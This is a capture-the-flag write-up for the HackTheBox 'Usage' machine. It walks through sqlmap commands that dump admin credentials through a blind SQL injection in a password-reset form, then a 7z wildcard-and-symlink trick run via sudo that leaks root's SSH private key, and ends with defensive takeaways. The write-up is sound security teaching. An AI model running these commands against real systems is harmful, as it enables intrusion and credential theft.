Phase 1

Initial Access — Blind SQLi → Admin Login → File Upload RCE

Blind SQL Injection on Forgot Password

The /forget-password page's email parameter is injectable — a single quote triggers a 500 error.

sqlmap gotcha Use a valid email (e.g. max@htb.com) as the injection point, not one with a single quote already in it. If you feed sqlmap a request that's already erroring, it can't distinguish injected vs baseline behavior and fails to identify the vulnerability.

Capture the request in Burp and save as req.txt:

POST /forget-password HTTP/1.1
Host: usage.htb
Content-Type: application/x-www-form-urlencoded
Cookie: XSRF-TOKEN=...; laravel_session=...

_token=mmeipGplysZmPznwhTjPauZyUd7LCGN9lnqlihsL&email=max@htb.com

sqlmap Dump

# Enumerate databases
$ sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql --dbs

# Enumerate tables in usage_blog
$ sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql \
  -D usage_blog --tables

# Dump admin credentials
$ sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql \
  -D usage_blog -T admin_users --dump

Phase 3

Privilege Escalation — 7z @symlink File Read

Sudo Enumeration

xander@usage:~$ sudo -l
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

Reverse Engineering the Binary

xander@usage:~$ strings /usr/bin/usage_management
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql

Option 1 (Project Backup) runs 7za ... * in /var/www/html as root. The wildcard * expands to all filenames in the directory — including ones we create.

7z @filename attack explained 7-Zip has a feature: if a filename starts with @, 7z treats the file's contents as a list of files to compress. Combined with a symlink:

1. Create @id_rsa (empty file) — 7z sees the @ prefix and reads a file named id_rsa as a file list.
2. Create id_rsa as a symlink to /root/.ssh/id_rsa — 7z follows the symlink and reads root's private key.
3. 7z tries to parse the SSH key as a list of filenames. It fails, but prints the content in error messages — leaking the entire private key to the screen.

The -snl flag (store symbolic links) only affects how links are stored in the archive — it doesn't prevent 7z from following the symlink when reading @ file lists.

Exploitation

xander@usage:~$ cd /var/www/html

# Create @ prefixed file — 7z will read 'id_rsa' as a file list
xander@usage:/var/www/html$ touch @id_rsa

# Create symlink pointing to root's SSH key
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa

# Trigger the backup (option 1)
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
...
Enter your choice (1/2/3): 1

Appendix

Key Takeaways

Blind SQLi needs a clean baseline request.

Feed sqlmap a valid email, not one that's already causing errors. --level 5 --risk 3 is needed for more exotic injection points like password reset forms.

Client-side file validation is not security.

CVE-2023-24249: Laravel-Admin checks extensions in JavaScript only. Burp intercept → change .jpg to .php → server happily executes it.

Config files in home directories leak credentials.

.monitrc, .my.cnf, .pgpass, .env — always check dotfiles for plaintext passwords. They're often reused across accounts.

7z @ + wildcard + symlink = arbitrary file read.

When a sudo command runs 7z ... * in a user-writable directory, the @filename feature turns 7z into a file-read oracle. This is a well-known but underappreciated privilege escalation technique.

Never use wildcards in sudo commands.

* in shell commands expands to user-controlled filenames. Attackers can create filenames like @id_rsa, --checkpoint-action, or -e to inject arguments. Always use explicit paths.
